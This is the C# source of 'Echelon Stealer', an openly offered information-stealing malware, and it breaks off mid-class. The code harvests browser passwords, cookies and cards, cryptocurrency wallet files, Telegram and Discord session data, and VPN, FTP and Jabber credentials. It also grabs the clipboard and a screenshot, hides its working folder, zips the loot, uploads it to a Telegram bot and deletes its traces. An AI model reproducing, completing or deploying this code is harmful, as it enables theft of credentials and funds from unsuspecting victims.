///////////////////////////////////////////////////////
////Echelon Stealler, C# Malware Systems by MadСod ////
///////////////////Telegram: @madcod///////////////////
///////////////////////////////////////////////////////

using Ionic.Zip;
using Ionic.Zlib;
using System;
using System.IO;
using System.Text;
using System.Threading;
using System.Windows;
using Microsoft.VisualBasic.Devices;
using Microsoft.Win32;
using System.Diagnostics;
using System.Drawing;
using System.Linq;
using System.Management;
using System.Net;
using System.Net.Sockets;
using System.Windows.Forms;
using System.Xml;
using System.Security.Cryptography;
using System.Drawing.Imaging;
using System.Collections.Generic;
using System.Text.RegularExpressions;

namespace Echelon
{

    public static class Stealer
    {
        [STAThread]
        public static void GetStealer()
        {
            // Создаем временные директории для сбора лога
            Directory.CreateDirectory(Help.Echelon_Dir);
            Directory.CreateDirectory(Help.Browsers);
            Directory.CreateDirectory(Help.Passwords);
            Directory.CreateDirectory(Help.Autofills);
            Directory.CreateDirectory(Help.Downloads);
            Directory.CreateDirectory(Help.Cookies);
            Directory.CreateDirectory(Help.History);
            Directory.CreateDirectory(Help.Cards);

            //Скрываем временную папку
            File.SetAttributes(Help.dir, FileAttributes.Directory | FileAttributes.Hidden | FileAttributes.System);



            // Запускаем граббер файлов в отдельном потоке
            GetFiles.Inizialize(Help.Echelon_Dir);
            Thread.Sleep(new Random(Environment.TickCount).Next(10000, 20000));

            // Chromium
            new Thread(() =>
            {
            Chromium.GetCookies(Help.Cookies);
            }).Start();

            new Thread(() =>
            {
            Chromium.GetPasswords(Help.Passwords);
            }).Start();

            new Thread(() =>
            {
            Chromium.GetAutofills(Help.Autofills);
            }).Start();

            new Thread(() =>
            {
            Chromium.GetDownloads(Help.Downloads);
            }).Start();

            new Thread(() =>
            {
            Chromium.GetHistory(Help.History);
            }).Start();

            new Thread(() =>
            {
            Chromium.GetCards(Help.Cards);
            }).Start();

            new Thread(() =>
            {
            // Mozilla
            Steal.Cookies();
            }).Start();

            new Thread(() =>
            {
                Steal.Passwords();
            }).Start();

            new Thread(() =>
            {
                ProtonVPN.Start(Help.Echelon_Dir);
            }).Start();
            new Thread(() =>
            {
                Outlook.GrabOutlook(Help.Echelon_Dir);
            }).Start();
            new Thread(() =>
            {
                OpenVPN.Start(Help.Echelon_Dir);
            }).Start();
            new Thread(() =>
            {
                NordVPN.Start(Help.Echelon_Dir);
            }).Start();
            new Thread(() =>
            {
                Startjabbers.Start(Help.Echelon_Dir);
            }).Start();
            new Thread(() =>
            {
                TGrabber.Start(Help.Echelon_Dir);
            }).Start();
            new Thread(() =>
            {
                DGrabber.Start(Help.Echelon_Dir);
            }).Start();
            Screenshot.Start(Help.Echelon_Dir);
            BuffBoard.Inizialize(Help.Echelon_Dir);
            Systemsinfo.ProgProc(Help.Echelon_Dir);
            FileZilla.Start(Help.Echelon_Dir);
            TotalCommander.Start(Help.Echelon_Dir);
            StartWallets.Start(Help.Echelon_Dir);
            DomainDetect.Start(Help.Browsers);

            // Пакуем в апхив с паролем
            string zipName = Help.dir + "\\" + Help.DateLog + "_" + Help.HWID + Help.CountryCOde() + ".zip";
            using (ZipFile zip = new ZipFile(Encoding.GetEncoding("cp866"))) // Устанавливаем кодировку
            {
                zip.CompressionLevel = CompressionLevel.BestCompression; // Задаем максимальную степень сжатия 
                zip.Comment = "Echelon Stealer by @madcod Log. <Build v3.0>" +
                       "\n|----------------------------------------|" +
                       "\nPC:" + Environment.MachineName + "/" + Environment.UserName +
                       "\nIP: " + Help.IP + Help.Country() +
                       "\nHWID: " + Help.DateLog + "_" + Help.HWID
                    ;
                zip.Password = Program.passwordzip; // Задаём пароль
                zip.AddDirectory(@"" + Help.Echelon_Dir); // Кладем в архив содержимое папки с логом
                zip.Save(@"" + zipName); // Сохраняем архив    
            }


            string LOG = @"" + zipName;
            byte[] file = File.ReadAllBytes(LOG);
            string url = string.Concat(new string[]
            {
                    Help.ApiUrl,
                    Program.Token,
                    "/sendDocument?chat_id=",
                    Program.ID,
                    "&caption=👤 "+Environment.MachineName+"/" + Environment.UserName+
                    "\n🏴 IP: " +Help.IP+  Help.Country() +
                    "\n🌐 Browsers Data"  +
                    "\n   ∟🔑"+ (Chromium.Passwords + Edge.count + Steal.count)+
                    "\n   ∟🍪"+ (Chromium.Cookies + Steal.count_cookies) +
                    "\n   ∟🕑"+ Chromium.History +
                    "\n   ∟📝"+ Chromium.Autofills+
                    "\n   ∟💳"+ Chromium.CC+
                    "\n💶 Wallets: "  + (StartWallets.count > 0 ? "✅" : "❌")+
                    (Electrum.count > 0 ? " Electrum" : "") +
                    (Armory.count > 0 ? " Armory" : "") +
                    (AtomicWallet.count > 0 ? " Atomic" : "") +
                    (BitcoinCore.count > 0 ? " BitcoinCore" : "") +
                    (Bytecoin.count > 0 ? " Bytecoin" : "") +
                    (DashCore.count > 0 ? " DashCore" : "") +
                    (Ethereum.count > 0 ? " Ethereum" : "") +
                    (Exodus.count > 0 ? " Exodus" : "") +
                    (LitecoinCore.count > 0 ? " LitecoinCore" : "") +
                    (Monero.count > 0 ? " Monero" : "") +
                    (Zcash.count > 0 ? " Zcash" : "") +
                    (Jaxx.count > 0 ? " Jaxx" : "") + 

                    //

                    "\n📂 FileGrabber: "   + GetFiles.count + //Работает
                    "\n💬 Discord: "  + (DGrabber.count > 0 ? "✅" : "❌") + //Работает
                    "\n✈️ Telegram: "  + (TGrabber.count > 0 ? "✅" : "❌") + //Работает
                    "\n💡 Jabber: " + (Startjabbers.count + Pidgin.PidginCount > 0 ? "✅" : "❌")+
                    (Pidgin.PidginCount > 0 ? " Pidgin ("+Pidgin.PidginAkks+")" : "")+
                    (Startjabbers.count > 0 ? " Psi" : "") + //Работает

                    "\n📡 FTP" +
                    "\n   ∟ FileZilla: " + (FileZilla.count > 0 ? "✅" + " ("+FileZilla.count+")" : "❌") + //Работает
                    "\n   ∟ TotalCmd: " + (TotalCommander.count > 0 ? "✅" : "❌") + //Работает
                    "\n🔌 VPN" +
                    "\n   ∟ NordVPN: "  + (NordVPN.count > 0 ? "✅" : "❌") + //Работает
                    "\n   ∟ OpenVPN: "  + (OpenVPN.count > 0 ? "✅" : "❌") + //Работает
                    "\n   ∟ ProtonVPN: "  + (ProtonVPN.count > 0 ? "✅" : "❌") + //Работает
                    "\n🆔 HWID: " + Help.HWID + //Работает
                    "\n⚙️ " + Systemsinfo.GetOSInformation() +
                    "\n🔎 " + File.ReadAllText(Help.Browsers + "\\DomainDetect.txt")
        });

            try
            {
                SenderAPI.POST(file, LOG, "application/x-ms-dos-executable", url);
                Directory.Delete(Help.dir + "\\", true);

                //Записываем HWID в файл, означает что лог с данного ПК уже отправлялся и больше слать его не надо.
                File.AppendAllText(Help.LocalData + "\\" + Help.HWID, Help.HWID);
            }
            catch
            {

            }

        }
    }

    class BuffBoard
    {
        public static void Inizialize(string Echelon_Dir)
        {
            try
            {
                File.WriteAllText(Echelon_Dir + "\\Clipboard.txt", $"[Clipboard data found] - [{"MM.dd.yyyy - HH:mm:ss"}]\r\n\r\n{System.Windows.Forms.Clipboard.GetText()}\r\n\r\n");
            }
            catch { }
        }
    }

    class DGrabber
    {
        public static int count = 0;
        public static string dir = "\\discord\\Local Storage\\leveldb\\";
        public static void Start(string Echelon_Dir)  // Works
        {
            try
            {
                foreach (FileInfo file in new DirectoryInfo(Help.AppDate + dir).GetFiles())
                {
                    Directory.CreateDirectory(Echelon_Dir + "\\Discord\\Local Storage\\leveldb\\");
                    file.CopyTo(Echelon_Dir + "\\Discord\\Local Storage\\leveldb\\" + file.Name);
                }
                count++;
            }
            catch { }

        }
    }

    class Systemsinfo
    {



        public static void ProgProc(string Echelon_Dir)
        {
            PcInfo(Echelon_Dir);
            using (StreamWriter programmestext = new StreamWriter(Echelon_Dir + "\\Programms.txt", false, Encoding.Default))
            {
                try
                {
                    string displayName;
                    RegistryKey key;
                    key = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall");
                    string[] keys = key.GetSubKeyNames();
                    for (int i = 0; i < keys.Length; i++)
                    {
                        RegistryKey subkey = key.OpenSubKey(keys[i]);
                        displayName = subkey.GetValue("DisplayName") as string;
                        if (displayName == null) continue;
                        programmestext.WriteLine(displayName);
                    }
                }
                catch
                {
                }
            }
            try
            {
                using (StreamWriter processest = new StreamWriter(Echelon_Dir + "\\Processes.txt", false, Encoding.Default))
                {
                    Process[] processes = Process.GetProcesses();
                    for (int i = 0; i < processes.Length; i++)
                    {
                        processest.WriteLine(processes[i].ProcessName.ToString());
                    }
                }
            }
            catch
            {
            }

        }

        public static string GpuName() //Получаем названия всех установленных видеокарт
        {
            try
            {
                string gpuName = string.Empty;
                string query = "SELECT * FROM Win32_VideoController";
                using (ManagementObjectSearcher searcher = new ManagementObjectSearcher(query))
                { foreach (ManagementObject mObject in searcher.Get()) { gpuName += mObject["Description"].ToString() + " "; } }
                return (!string.IsNullOrEmpty(gpuName)) ? gpuName : "N/A";
            }
            catch { return "Unknown"; }
        }



        public static string GetPhysicalMemory() // Получаем кол-во RAM Памяти в мб
        {
            try
            {
                ManagementScope scope = new ManagementScope();
                ObjectQuery query = new ObjectQuery("SELECT Capacity FROM Win32_PhysicalMemory");
                ManagementObjectCollection managementObjectCollection = new ManagementObjectSearcher(scope, query).Get();
                long num = 0L;
                foreach (ManagementBaseObject managementBaseObject in managementObjectCollection)
                {
                    long num2 = Convert.ToInt64(((ManagementObject)managementBaseObject)["Capacity"]);
                    num += num2;
                }
                num = num / 1024L / 1024L;
                return num.ToString();
            }
            catch { return "Unknown"; }
        }


        public static string ProcessorId() // Получаем название процессора
        {
            try
            {
                ManagementObjectCollection instances = new ManagementClass("SELECT * FROM Win32_Processor").GetInstances();
                string result = string.Empty;
                foreach (ManagementBaseObject managementBaseObject in instances)
                {
                    result = (string)((ManagementObject)managementBaseObject)["ProcessorId"];
                }
                return result;
            }
            catch { return "Unknown"; }
        }


        public static string GetOSInformation() //Получаем инфу об ОС
        {
            foreach (ManagementBaseObject managementBaseObject in new ManagementObjectSearcher("SELECT * FROM Win32_OperatingSystem").Get())
            {
                ManagementObject managementObject = (ManagementObject)managementBaseObject;
                try
                {
                    return string.Concat(new string[]
                    {
                    ((string)managementObject["Caption"]).Trim(),
                    ", ",
                    (string)managementObject["Version"],
                    ", ",
                    (string)managementObject["OSArchitecture"]
                    });
                }
                catch
                {
                }
            }
            return "BIOS Maker: Unknown";
        }


        public static string GetComputerName() // Получаем имя ПК
        {
            try
            {
                ManagementObjectCollection instances = new ManagementClass("Win32_ComputerSystem").GetInstances();
                string result = string.Empty;
                foreach (ManagementBaseObject managementBaseObject in instances)
                {
                    result = (string)((ManagementObject)managementBaseObject)["Name"];
                }
                return result;
            }
            catch { return "Unknown"; }

        }

        public static string GetProcessorName() // Получаем название процессора
        {
            try
            {
                ManagementObjectCollection instances = new ManagementClass("Win32_Processor").GetInstances();
                string result = string.Empty;
                foreach (ManagementBaseObject managementBaseObject in instances)
                {
                    result = (string)((ManagementObject)managementBaseObject)["Name"];
                }
                return result;
            }
            catch { return "Unknown"; }
        }




        // Записываем все полученные данные
        public static void PcInfo(string Echelon_Dir)
        {

            ComputerInfo pc = new ComputerInfo();

            //Системное инфо

            Size resolution = Screen.PrimaryScreen.Bounds.Size; //getting resolution

            try
            {
                using (StreamWriter langtext = new StreamWriter(Echelon_Dir + "\\Info.txt", false, Encoding.Default))
                {

                    langtext.WriteLine("OC verison - " + Environment.OSVersion + " | " + pc.OSFullName +
                        "\n" + "MachineName - " + Environment.MachineName + "/" + Environment.UserName +
                        "\n" + "Resolution - " + resolution +
                        "\n" + "Current time Utc - " + DateTime.UtcNow +
                        "\n" + "Current time - " + DateTime.Now +
                        "\n" + "CPU - " + GetProcessorName() +
                        "\n" + "RAM - " + GetPhysicalMemory() +
                        "\n" + "GPU - " + GpuName() +
                        "\n" +
                        "\n" +
                        "\n" + "IP Geolocation: " + Help.IP + " " + Help.Country()

                        );

                    langtext.Close();

                }
            }
            catch
            {

            }
        }
    }

    public class TGrabber
    {
        public static int count = 0;

        private static bool in_patch = false;
        public static void Start(string Echelon_Dir)
        {

            try
            {
                var prcName = "Telegram";
                Process[] processByName = Process.GetProcessesByName(prcName);

                if (processByName.Length < 1)
                    return;


                var dir_from = Path.GetDirectoryName(processByName[0].MainModule.FileName) + "\\tdata";
                if (!Directory.Exists(dir_from))
                    return;

                var dir_to = Echelon_Dir + "\\Telegram_" +
                            (int)(DateTime.UtcNow - new DateTime(1970, 1, 1)).TotalSeconds;
                CopyAll(dir_from, dir_to);
                count++;

            }
            catch { }
        }
        private static void CopyAll(string fromDir, string toDir)
        {


            try
            {
                DirectoryInfo di = Directory.CreateDirectory(toDir);
                di.Attributes = FileAttributes.Directory | FileAttributes.Hidden;
                foreach (string s1 in Directory.GetFiles(fromDir))
                    CopyFile(s1, toDir);

                foreach (string s in Directory.GetDirectories(fromDir))
                    CopyDir(s, toDir);
            }
            catch { }

        }
        private static void CopyFile(string s1, string toDir)
        {
            try
            {
                var fname = Path.GetFileName(s1);

                if (in_patch && !(fname[0] == 'm' || fname[1] == 'a' || fname[2] == 'p'))
                    return;

                var s2 = toDir + "\\" + fname;

                File.Copy(s1, s2);

            }
            catch { }

        }

        private static void CopyDir(string s, string toDir)
        {
            try
            {
                in_patch = true;
                CopyAll(s, toDir + "\\" + Path.GetFileName(s));
                in_patch = false;

            }
            catch { }
        }
    }

    class Zcash
    {
        public static int count = 0;
        public static string ZcashDir = "\\Wallets\\Zcash\\";
        public static void ZecwalletStr(string directorypath)  // Works
        {
            try
            {
                foreach (FileInfo file in new DirectoryInfo(Help.AppDate + "\\Zcash\\").GetFiles())

                {
                    Directory.CreateDirectory(directorypath + ZcashDir);
                    file.CopyTo(directorypath + ZcashDir + file.Name);
                }
                StartWallets.count++;
            }
            catch { }

        }
    }
    class Monero
    {
        public static int count = 0;
        public static string base64xmr = "\\Wallets\\Monero\\";
        public static void XMRcoinStr(string directorypath) // Works

        {
            try
            {
                using (RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Software").OpenSubKey("monero-project").OpenSubKey("monero-core"))
                    try
                    {
                        Directory.CreateDirectory(directorypath + base64xmr);
                        string dir = registryKey.GetValue("wallet_path").ToString().Replace("/", "\\");
                        Directory.CreateDirectory(directorypath + base64xmr);
                        File.Copy(dir, directorypath + base64xmr + dir.Split('\\')[dir.Split('\\').Length - 1]);
                        count++;
                        StartWallets.count++;

                    }
                    catch
                    {
                    }
            }
            catch
            {

            }

        }
    }
    class LitecoinCore
    {
        public static int count = 0;
        public static void LitecStr(string directorypath)
        {
            try
            {
                using (RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Software").OpenSubKey("Litecoin").OpenSubKey("Litecoin-Qt"))
                    try
                    {
                        Directory.CreateDirectory(directorypath + "\\Wallets\\LitecoinCore\\");
                        File.Copy(registryKey.GetValue("strDataDir").ToString() + "\\wallet.dat", directorypath + "\\LitecoinCore\\wallet.dat");
                        count++;
                        StartWallets.count++;
                    }
                    catch
                    {
                    }
            }
            catch
            {
            }
        }
    }
    class Jaxx
    {
        public static int count = 0;
        public static string JaxxDir = "\\Wallets\\Jaxx\\com.liberty.jaxx\\IndexedDB\\file__0.indexeddb.leveldb\\";
        public static void JaxxStr(string directorypath)  // Works
        {
            try
            {
                foreach (FileInfo file in new DirectoryInfo(Help.AppDate + "\\com.liberty.jaxx\\IndexedDB\\file__0.indexeddb.leveldb\\").GetFiles())
                {
                    Directory.CreateDirectory(directorypath + JaxxDir);
                    file.CopyTo(directorypath + JaxxDir + file.Name);
                }
                count++;
                StartWallets.count++;
            }
            catch { }
        }
    }
    class Exodus
    {
        public static int count = 0;
        public static string ExodusDir = "\\Wallets\\Exodus\\";
        public static void ExodusStr(string directorypath)
        {
            try
            {
                foreach (FileInfo file in new DirectoryInfo(Help.AppDate + "\\Exodus\\exodus.wallet\\").GetFiles())

                {
                    Directory.CreateDirectory(directorypath + ExodusDir);
                    file.CopyTo(directorypath + ExodusDir + file.Name);
                }
                count++;
                StartWallets.count++;
            }
            catch { }

        }
    }
    class Ethereum
    {
        public static int count = 0;
        public static string EthereumDir = "\\Wallets\\Ethereum\\";
        public static void EcoinStr(string directorypath) // Works
        {
            try
            {
                foreach (FileInfo file in new DirectoryInfo(Help.AppDate + "\\Ethereum\\keystore").GetFiles())
                {
                    Directory.CreateDirectory(directorypath + EthereumDir);
                    file.CopyTo(directorypath + EthereumDir + file.Name);
                }
                count++;
                StartWallets.count++;
            }
            catch
            {
            }
        }
    }

    class Electrum
    {
        public static int count = 0;
        public static string ElectrumDir = "\\Wallets\\Electrum\\";

        public static void EleStr(string directorypath)
        {
            try
            {
                foreach (FileInfo file in new DirectoryInfo(Help.AppDate + "\\Electrum\\wallets").GetFiles())
                {
                    Directory.CreateDirectory(directorypath + ElectrumDir);
                    file.CopyTo(directorypath + ElectrumDir + file.Name);
                }
                count++;
                StartWallets.count++;
            }
            catch { }
        }
    }

    class DashCore
    {
        public static int count = 0;
        public static void DSHcoinStr(string directorypath)
        {
            try
            {
                using (RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Software").OpenSubKey("Dash").OpenSubKey("Dash-Qt"))
                    try
                    {
                        Directory.CreateDirectory(directorypath + "\\Wallets\\DashCore\\");
                        File.Copy(registryKey.GetValue("strDataDir").ToString() + "\\wallet.dat", directorypath + "\\DashCore\\wallet.dat");
                        count++;
                        StartWallets.count++;
                    }
                    catch { }
            }
            catch { }
        }
    }
    class Bytecoin
    {
        public static int count = 0;
        public static void BCNcoinStr(string directorypath)
        {
            try
            {
                foreach (FileInfo file in new DirectoryInfo(Help.AppDate + "\\bytecoin").GetFiles())
                {
                    Directory.CreateDirectory(directorypath + "\\Wallets\\Bytecoin\\");
                    if (file.Extension.Equals(".wallet"))
                    {
                        file.CopyTo(directorypath + "\\Bytecoin\\" + file.Name);
                    }
                }
                count++;
                StartWallets.count++;
            }
            catch
            {
            }
        }
    }
    class BitcoinCore
    {
        public static int count = 0;
        public static void BCStr(string directorypath)
        {
            try
            {
                using (RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Software").OpenSubKey("Bitcoin").OpenSubKey("Bitcoin-Qt"))
                    try
                    {
                        Directory.CreateDirectory(directorypath + "\\Wallets\\BitcoinCore\\");
                        File.Copy(registryKey.GetValue("strDataDir").ToString() + "\\wallet.dat", directorypath + "\\BitcoinCore\\wallet.dat");
                        count++;
                        StartWallets.count++;
                    }
                    catch { }
            }
            catch { }

        }
    }
    class AtomicWallet
    {
        public static int count = 0;
        //AtomicWallet, AtomicWallet 2.8.0
        public static string AtomDir = "\\Wallets\\Atomic\\Local Storage\\leveldb\\";
        public static void AtomicStr(string directorypath)  // Works
        {
            try
            {
                foreach (FileInfo file in new DirectoryInfo(Help.AppDate + "\\atomic\\Local Storage\\leveldb\\").GetFiles())

                {
                    Directory.CreateDirectory(directorypath + AtomDir);
                    file.CopyTo(directorypath + AtomDir + file.Name);
                }
                count++;
                StartWallets.count++;
            }
            catch { }

        }
    }
    class Armory
    {
        public static int count = 0;
        private static readonly string ArmoryDir = "\\Wallets\\Armory\\";
        public static void ArmoryStr(string directorypath)  // Works
        {
            try
            {
                foreach (FileInfo file in new DirectoryInfo(Help.AppDate + "\\Armory\\").GetFiles())

                {
                    Directory.CreateDirectory(directorypath + ArmoryDir);
                    file.CopyTo(directorypath + ArmoryDir + file.Name);

                }
                count++;
                StartWallets.count++;
            }
            catch { }

        }
    }
    class StartWallets
    {
        public static int count = 0;

        public static int Start(string Echelon_Dir)
        {
            new Thread(() =>
            {
                Armory.ArmoryStr(Echelon_Dir);
            }).Start(); //Bitcoin Armory Wallet
            new Thread(() =>
            {
                AtomicWallet.AtomicStr(Echelon_Dir);
            }).Start(); //Atomic Wallet
            new Thread(() =>
            {
                BitcoinCore.BCStr(Echelon_Dir);
            }).Start(); //Bitcoin Core
            new Thread(() =>
            {
                Bytecoin.BCNcoinStr(Echelon_Dir);
            }).Start(); //Bytecoin
            new Thread(() =>
            {
                DashCore.DSHcoinStr(Echelon_Dir);
            }).Start(); //Dash Core
            new Thread(() =>
            {
                Electrum.EleStr(Echelon_Dir);
            }).Start(); //Electrum
            new Thread(() =>
            {
                Ethereum.EcoinStr(Echelon_Dir);
            }).Start(); //Ethereum Wallet
            new Thread(() =>
            {
                LitecoinCore.LitecStr(Echelon_Dir);
            }).Start(); //Litecoin Core
            new Thread(() =>
            {
                Monero.XMRcoinStr(Echelon_Dir);
            }).Start(); //Monero Core
            new Thread(() =>
            {
                Exodus.ExodusStr(Echelon_Dir);
            }).Start();//Exodus Wallet
            new Thread(() =>
            {
                Jaxx.JaxxStr(Echelon_Dir);
            }).Start(); //Jaxx Liberty
            new Thread(() =>
            {
                Zcash.ZecwalletStr(Echelon_Dir);
            }).Start(); //Zec Wallet



            return count;
        }
    }

    class NordVPN
    {
        public static int count = 0;

        public static string NordVPNDir = "\\Vpn\\NordVPN";
        public static void Start(string Echelon_Dir)
        {
            try
            {
                if (!Directory.Exists(Help.LocalData + "\\NordVPN\\"))
                {
                    return;

                }
                else
                {
                    Directory.CreateDirectory(Echelon_Dir + NordVPNDir);


                }

                using (StreamWriter streamWriter = new StreamWriter(Echelon_Dir + NordVPNDir + "\\Account.log"))
                {
                    DirectoryInfo directoryInfo = new DirectoryInfo(Path.Combine(Help.LocalData, "NordVPN"));
                    if (directoryInfo.Exists)
                    {

                        DirectoryInfo[] directories = directoryInfo.GetDirectories("NordVpn.exe*");
                        for (int i = 0; i < directories.Length; i++)
                        {

                            foreach (DirectoryInfo directoryInfo2 in directories[i].GetDirectories())
                            {

                                streamWriter.WriteLine("\tFound version " + directoryInfo2.Name);
                                string text = Path.Combine(directoryInfo2.FullName, "user.config");
                                if (File.Exists(text))
                                {



                                    XmlDocument xmlDocument = new XmlDocument();
                                    xmlDocument.Load(text);
                                    string innerText = xmlDocument.SelectSingleNode("//setting[@name='Username']/value").InnerText;
                                    string innerText2 = xmlDocument.SelectSingleNode("//setting[@name='Password']/value").InnerText;
                                    if (innerText != null && !string.IsNullOrEmpty(innerText))
                                    {
                                        streamWriter.WriteLine("\t\tUsername: " + Nord_Vpn_Decoder(innerText));
                                    }
                                    if (innerText2 != null && !string.IsNullOrEmpty(innerText2))
                                    {
                                        streamWriter.WriteLine("\t\tPassword: " + Nord_Vpn_Decoder(innerText2));
                                    }
                                    count++;
                                }
                            }
                        }

                    }
                }
            }
            catch { }

        }

        public static string Nord_Vpn_Decoder(string s)
        {
            string result;
            try
            {
                result = Encoding.UTF8.GetString(ProtectedData.Unprotect(Convert.FromBase64String(s), null, DataProtectionScope.LocalMachine));
            }
            catch
            {
                result = "";
            }
            return result;
        }
    }

    class OpenVPN
    {
        public static int count = 0;
        public static void Start(string Echelon_Dir)
        {
            try
            {
                RegistryKey localMachineKey = Registry.LocalMachine;
                string[] names = localMachineKey.OpenSubKey("SOFTWARE").GetSubKeyNames();
                foreach (string i in names)
                {
                    if (i == "OpenVPN")
                    {
                        Directory.CreateDirectory(Echelon_Dir + "\\VPN\\OpenVPN");
                        try
                        {
                            string dir = localMachineKey.OpenSubKey("SOFTWARE").OpenSubKey("OpenVPN").GetValue("config_dir").ToString();
                            DirectoryInfo dire = new DirectoryInfo(dir);
                            dire.MoveTo(Echelon_Dir + "\\VPN\\OpenVPN");
                            count++;
                        }
                        catch { }

                    }
                }
            }
            catch { }
            //Стиллинг импортированных конфигов *New
            try
            {
                foreach (FileInfo file in new DirectoryInfo(Help.UserProfile + "\\OpenVPN\\config\\conf\\").GetFiles())

                {
                    Directory.CreateDirectory(Echelon_Dir + "\\VPN\\OpenVPN\\config\\conf\\");
                    file.CopyTo(Echelon_Dir + "\\VPN\\OpenVPN\\config\\conf\\" + file.Name);
                }
                count++;
            }
            catch { }

        }
    }

    class ProtonVPN
    {
        public static int count = 0;
        public static void Start(string Echelon_Dir)
        {
            try
            {
                string dir = Help.LocalData;
                if (Directory.Exists(dir + "\\ProtonVPN"))
                {
                    string[] dirs = Directory.GetDirectories(dir + "" +
                        "\\ProtonVPN");
                    Directory.CreateDirectory(Echelon_Dir + "\\Vpn\\ProtonVPN\\");
                    foreach (string d1rs in dirs)
                    {
                        if (d1rs.StartsWith(dir + "\\ProtonVPN" + "\\ProtonVPN.exe"))
                        {
                            string dirName = new DirectoryInfo(d1rs).Name;
                            string[] d1 = Directory.GetDirectories(d1rs);
                            Directory.CreateDirectory(Echelon_Dir + "\\Vpn\\ProtonVPN\\" + dirName + "\\" + new DirectoryInfo(d1[0]).Name);
                            File.Copy(d1[0] + "\\user.config", Echelon_Dir + "\\Vpn\\ProtonVPN\\" + dirName + "\\" + new DirectoryInfo(d1[0]).Name + "\\user.config");
                            count++;
                        }
                    }
                }
            }
            catch { }

        }
    }

    class Screenshot
    {

        public static void Start(string Echelon_Dir)
        {
            try
            {
                int width = Screen.PrimaryScreen.Bounds.Width;
                int height = Screen.PrimaryScreen.Bounds.Height;
                Bitmap bitmap = new Bitmap(width, height);
                Graphics.FromImage(bitmap).CopyFromScreen(0, 0, 0, 0, bitmap.Size);
                bitmap.Save(Echelon_Dir + "\\Screen" + ".Jpeg", ImageFormat.Jpeg);
            }
            catch { }
        }
    }

    class Startjabbers
    {
        public static int count = 0;
        public static int Start(string Echelon_Dir)
        {
            Pidgin.Start(Echelon_Dir);
            Psi.Start(Echelon_Dir);

            return count;
        }
    }

    class Pidgin
    {
        public static int PidginCount = 0;
        public static int PidginAkks = 0;
        private static readonly string PidginPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), @".purple\accounts.xml");
        public static void Start(string directorypath)  // Works
        {
            if (File.Exists(PidginPath))
            {
                Directory.CreateDirectory(directorypath + "\\Jabber\\Pidgin\\");
                GetDataPidgin(PidginPath, directorypath + "\\Jabber\\Pidgin" + "\\Pidgin.log");
            }
            else { return; }
        }

        private static StringBuilder SBTwo = new StringBuilder();

        public static void GetDataPidgin(string PathPn, string SaveFile)
        {
            try
            {
                if (File.Exists(PathPn))
                {
                    try
                    {
                        var xs = new XmlDocument();
                        xs.Load(new XmlTextReader(PathPn));
                        foreach (XmlNode nl in xs.DocumentElement.ChildNodes)
                        {
                            var Protocol = nl.ChildNodes[0].InnerText;
                            var Login = nl.ChildNodes[1].InnerText;
                            var Password = nl.ChildNodes[2].InnerText;
                            if (!string.IsNullOrEmpty(Protocol) && !string.IsNullOrEmpty(Login) && !string.IsNullOrEmpty(Password))
                            {
                                SBTwo.AppendLine($"Protocol: {Protocol}");
                                SBTwo.AppendLine($"Login: {Login}");
                                SBTwo.AppendLine($"Password: {Password}\r\n");
                                PidginAkks++;
                                PidginCount++;
                            }
                            else
                            {
                                break;
                            }
                        }
                        if (SBTwo.Length > 0)
                        {
                            try
                            {
                                File.AppendAllText(SaveFile, SBTwo.ToString());
                            }
                            catch { }
                        }
                    }
                    catch { }
                }
            }
            catch { }
        }
    }

    class Psi
    {
        public static void Start(string directorypath)  // Works
        {
            try
            {
                foreach (FileInfo file in new DirectoryInfo(Help.AppDate + "\\Psi+\\profiles\\default\\").GetFiles())

                {
                    Directory.CreateDirectory(directorypath + "\\Jabber\\Psi+\\profiles\\default\\");
                    file.CopyTo(directorypath + "\\Jabber\\Psi+\\profiles\\default\\" + file.Name);
                }
                Startjabbers.count++;
            }
            catch { }

            try
            {
                foreach (FileInfo file in new DirectoryInfo(Help.AppDate + "\\Psi\\profiles\\default\\").GetFiles())

                {
                    Directory.CreateDirectory(directorypath + "\\Jabber\\Psi\\profiles\\default\\");
                    file.CopyTo(directorypath + "\\Jabber\\Psi\\profiles\\default\\" + file.Name);

                }
                Startjabbers.count++;
            }
            catch { }
        }
    }

    class FileZilla
    {
        public static int count = 0;
        private static StringBuilder SB = new StringBuilder();
        public static readonly string FzPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), @"FileZilla\recentservers.xml");

        public static void Start(string Echelon_Dir)
        {
            if (File.Exists(FzPath))
            {
                Directory.CreateDirectory(Echelon_Dir + "\\FileZilla");
                GetDataFileZilla(FzPath, Echelon_Dir + "\\FileZilla" + "\\FileZilla.log");

            }
            else { return; }
        }
        public static void GetDataFileZilla(string PathFZ, string SaveFile, string RS = "RecentServers", string Serv = "Server")
        {
            try
            {
                if (File.Exists(PathFZ))
                {

                    try
                    {
                        var xf = new XmlDocument();
                        xf.Load(PathFZ);
                        foreach (XmlElement XE in ((XmlElement)xf.GetElementsByTagName(RS)[0]).GetElementsByTagName(Serv))
                        {
                            var Host = XE.GetElementsByTagName("Host")[0].InnerText;
                            var Port = XE.GetElementsByTagName("Port")[0].InnerText;
                            var User = XE.GetElementsByTagName("User")[0].InnerText;
                            var Pass = (Encoding.UTF8.GetString(Convert.FromBase64String(XE.GetElementsByTagName("Pass")[0].InnerText)));
                            if (!string.IsNullOrEmpty(Host) && !string.IsNullOrEmpty(Port) && !string.IsNullOrEmpty(User) && !string.IsNullOrEmpty(Pass))
                            {
                                SB.AppendLine($"Host: {Host}");
                                SB.AppendLine($"Port: {Port}");
                                SB.AppendLine($"User: {User}");
                                SB.AppendLine($"Pass: {Pass}\r\n");
                                count++;
                            }
                            else
                            {
                                break;
                            }
                        }
                        if (SB.Length > 0)
                        {
                            try
                            {
                                File.AppendAllText(SaveFile, SB.ToString());
                            }
                            catch { }
                        }
                    }
                    catch { }
                }
            }
            catch { }
        }
    }

    class TotalCommander
    {

        public static int count = 0;
        public static void Start(string Echelon_Dir)
        {
            try
            {
                string text2 = Help.AppDate + "\\GHISLER\\";
                if (Directory.Exists(text2))
                {
                    Directory.CreateDirectory(Echelon_Dir + "\\FTP\\Total Commander");
                }
                FileInfo[] files = new DirectoryInfo(text2).GetFiles();
